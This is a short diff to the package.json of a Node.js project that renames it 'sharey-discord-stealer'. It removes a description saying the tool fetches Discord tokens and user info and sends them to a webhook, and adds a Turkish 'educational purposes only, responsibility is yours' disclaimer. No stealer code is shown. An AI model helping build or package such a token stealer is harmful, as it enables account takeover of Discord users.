@@ -1,7 +1,7 @@
 {
-    "name": "discord-info-fetcher",
+    "name": "sharey-discord-stealer",
     "version": "1.0.0",
-    "description": "Fetch Discord token and user info, send to webhook",
+    "description": "Sharey tarafından geliştirilmiştir ve eğitim amacıyla yapılmıştır. Sorumluluk sizindir herhangi bir yasadışı iş için yapılmamıştır.",
     "main": "fetch-info.js",
     "scripts": {
       "start": "node fetch-info.js",
